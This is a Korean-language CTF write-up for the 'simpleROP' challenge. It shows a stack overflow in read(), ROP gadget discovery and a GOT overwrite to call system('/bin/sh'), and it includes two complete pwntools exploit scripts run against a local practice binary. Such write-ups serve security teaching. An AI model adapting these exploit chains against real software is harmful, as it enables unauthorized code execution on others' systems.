# simpleROP 풀이

### checksec으로 보호기법 확인하기

![image](https://user-images.githubusercontent.com/59410565/119155248-f0521b80-ba8d-11eb-8199-cc0739685477.png)

NX bit가 걸려있어서 ROP로 문제를 해결해야 하면 될 것 같다.

------



### IDA로 simpleROP 살펴보기

![image](https://user-images.githubusercontent.com/59410565/119155437-27c0c800-ba8e-11eb-9f8f-d0dcfe6aeff1.png)

-> read 함수를 통해 주어진 buf의 크기(256)보다 더 많이(0x300 = 768) 입력받을 수 있다. 따라서 오버플로우 취약점이 발생한다.

------



### Debug

![image](https://user-images.githubusercontent.com/59410565/119158834-9b180900-ba91-11eb-8f5e-a7db45c45535.png)

**[Break Point]**

- main+0 : main 함수 코드 첫 부분
- main+40 : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/119159395-22657c80-ba92-11eb-9953-134932ff945e.png)

![image](https://user-images.githubusercontent.com/59410565/119159454-31e4c580-ba92-11eb-838b-3bcb51ebc287.png)

![image](https://user-images.githubusercontent.com/59410565/119159498-3dd08780-ba92-11eb-952b-f92c40dd15f3.png)

- 즉, 260개 이상의 문자를 입력함으로써 Return address를 덮어쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/119159598-5a6cbf80-ba92-11eb-841c-0642ff4a70d7.png)

- read@plt 영역에는 libc에서 read() 함수를 호출하기 위한 코드가 저장되어 있다.

```python
from pwn import *

e = ELF("./simpleROP")
print("read@plt : " + str(hex(e.plt["read"])))
print("read@got : " + str(hex(e.got["read"])))
```

> pwntools를 사용하여 주소를 출력하였다.

![image](https://user-images.githubusercontent.com/59410565/119156918-a407db00-ba8f-11eb-8b71-67768eb17423.png)

-> .plt : 0x8048320

-> .got.plt : 0x804a00c

![image](https://user-images.githubusercontent.com/59410565/119156661-6905a780-ba8f-11eb-9757-d3e786f3b2e3.png)

- read@got(0x80a00c) 영역에는 read@plt+6(0x08048326) 영역의 주소가 저장되어 있다. 해당 프로그램에서 read() 함수가 한 번도 호출되지 않았기 때문이다.

![image](https://user-images.githubusercontent.com/59410565/119159932-b9cacf80-ba92-11eb-9791-f299bcb57412.png)

![image](https://user-images.githubusercontent.com/59410565/119160032-ce0ecc80-ba92-11eb-9afe-e96e54dcb470.png)

- read() 함수가 호출된 후 read@got 영역에는 libc의 rerad() 함수 주소가 저장된다.

------



### Exploit

```
Exploit 순서

1. read 함수를 이용해 "/bin/sh" 명령을 쓰기 가능한 메모리 영역에 저장
2. write 함수를 이용해 read 함수의 .got 영역에 저장된 값을 출력
3. read 함수를 이용해 read 함수의 .got 영역에 system 함수의 주소로 덮어씀
4. read 함수 호출 -  read .got영역에 system 함수의 주소가 저장되어 있기 때문에 system 함수가 호출됨
```

```
#ROP code

read(0, writableArea, len(str(binsh)))
write(1, read_got, len(str(read_got)))
read(0, read_got, len(str(read_got)))
system(writableArea)
```

### 쓰기 가능한 영역 찾기

![image](https://user-images.githubusercontent.com/59410565/119160671-7755c280-ba93-11eb-842b-415d1aaab914.png)

- 해당 바이너리의 0x804a000 ~ 0x804b000 영역에 쓰기 권한이 부여되어 있다.

![image](https://user-images.githubusercontent.com/59410565/119160946-bc79f480-ba93-11eb-8e77-e44ca9763805.png)

![image](https://user-images.githubusercontent.com/59410565/119160989-c8fe4d00-ba93-11eb-9f1c-e5ded1c361a2.png)

- .got.plt / .data / .bss 가 앞에서 확인한 쓰기 가능한 영역에 포함되어 있다.

### 가젯 찾기

> rp++

![image](https://user-images.githubusercontent.com/59410565/119161299-1f6b8b80-ba94-11eb-8014-1786dcb951ed.png)

> ROPgadget

![image](https://user-images.githubusercontent.com/59410565/119161376-3b6f2d00-ba94-11eb-9565-c4d0621f5d8c.png)

### plt, got 주소 찾기 - read, write

![image](https://user-images.githubusercontent.com/59410565/119161600-77a28d80-ba94-11eb-9fd9-ea06396e29bf.png)

### system() 주소 찾기

![image](https://user-images.githubusercontent.com/59410565/119161845-b6384800-ba94-11eb-8576-6c41737c10ed.png)

### Exploit code

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
  
binsh = "/bin/sh"
  
stdin = 0
stdout = 1
  
read_plt = 0x8048320
read_got = 0x804a00c
write_plt = 0x8048350
write_got = 0x804a018

read_system_offset = 0x9ae70
writableArea = 0x0804a024 #.bss
pppr = 0x8048519 #pop pop pop ret
  
payload = "A"*260
 
 
#read(0,writableArea,len(str(binsh)))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(stdin)
payload += p32(writableArea)
payload += p32(len(str(binsh)))
 
#write(1,read_got,len(str(read_got)))
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(stdout)
payload += p32(read_got)
payload += p32(4)
 
#read(0,read_got,len(str(read_got)))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(stdin)
payload += p32(read_got)
payload += p32(len(str(read_got)))
 
#system(writableArea)
payload += p32(read_plt)
payload += p32(0xaaaabbbb)
payload += p32(writableArea)
  
r = process('./simpleROP')
r.recvn(0x13) #맨 처음 write 함수에서 0x13 byte만큼 화면에 출력되는 것
r.send(payload + '\n')
r.send(binsh)
r.recvn(0x119-0x4) #두 번째 write 함수에서 0x119-0x4(ret) byte만큼 화면에 출력되는 것
read = u32(r.recvn(4))
system_addr = read - read_system_offset
r.send(p32(system_addr))
r.interactive()

```

결과

![image](https://user-images.githubusercontent.com/59410565/119163484-6a869e00-ba96-11eb-872c-9536086da3fe.png)

+) 참고

![image](https://user-images.githubusercontent.com/59410565/119163302-3e6b1d00-ba96-11eb-8aee-4c2fa855b149.png)

+) pwntools 사용하여 작성한 코드

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
 
binsh = "/bin/sh"
 
binary = ELF('./simpleROP')
 
#32bit OS
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#64bit OS
#libc = ELF("/lib32/libc-2.23.so")
rop = ROP(binary)
 
print binary.checksec()
 
read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']
writableArea = 0x0804a024
 
#Address info
log.info("read@plt : " + str(hex(read_plt)))
log.info("read@got : " + str(hex(read_got)))
log.info("write@plt : " + str(hex(write_plt)))
log.info("write@got : " + str(hex(write_got)))
log.info("read system offset : " + str(hex(read_system_offset)))
log.info("Writeable area : " + str(writableArea))
 
#ROP Code
rop.read(0,writableArea,len(str(binsh)))
rop.write(1,read_got,4)
rop.read(0,read_got,len(str(read_got)))
rop.raw(read_plt)
rop.raw(0xaaaabbbb)
rop.raw(writableArea)
payload = "A"*260 + str(rop)
 
#Run
r = process("./simpleROP")
r.recvn(0x13)
r.send(payload + '\n')
r.send(binsh)
r.recvn(0x119-0x4)
read = u32(r.recvn(4))
system_addr = read - read_system_offset
rop = ROP(binary)
rop.raw(system_addr)
r.send(str(rop))
 
r.interactive()
```

결과

![image](https://user-images.githubusercontent.com/59410565/119164408-5d1de380-ba97-11eb-8abe-f374c840d2d8.png)